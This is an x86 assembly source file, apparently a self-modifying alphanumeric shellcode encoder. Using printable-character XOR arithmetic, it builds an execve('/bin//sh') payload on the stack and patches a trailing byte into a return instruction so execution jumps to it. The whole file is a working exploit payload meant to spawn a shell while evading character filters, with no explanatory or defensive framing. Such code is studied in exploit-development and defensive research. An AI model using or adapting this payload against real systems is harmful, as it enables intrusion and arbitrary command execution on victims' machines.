       /* alnum.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* set buffer register to ecx */
        push eax
        pop ecx

prepare_registers:
        push 0x30
        pop eax
        xor al, 0x30
                  /* omit eax, ecx */
        push eax  /* edx = 0 */
        push eax  /* ebx = 0 */
        push eax
        push eax
        push ecx  /* esi = buffer */
        push eax
        popad
        dec edx   /* edx = 0xffffffff */

patch_ret:
        /* 0x44 ^ 0x78 ^ 0xff == 0xc3 (ret) */
        push edx
        pop eax
        xor al, 0x44
        push edx
        push 0x30
        pop edx
        push edx
        pop edx
        xor [esi+edx*2+0x31], al
        pop edx

build_stack:
        /* push 0x80cd0b42 */
        push edx
        pop eax
        xor eax, 0x30433230
        xor eax, 0x4f713972
        push eax
        push esp
        pop ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x8de18953 */
        push edx
        pop eax
        xor eax, 0x31443030
        xor eax, 0x435a4663
        push eax
        push esp
        pop ecx
        xor [ecx], dh

        /* push 0x52e3896e */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x31443034
        xor eax, 0x6358465a
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x69622f68 */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x30304330
        xor eax, 0x59526c58
        push eax

        /* push 0x68732f2f */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x30304343
        xor eax, 0x58436c6c
        push eax

        /* push 0x6852d231 */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x30314141
        xor eax, 0x58636c70
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh

        push esp

ret:
        .byte 0x78
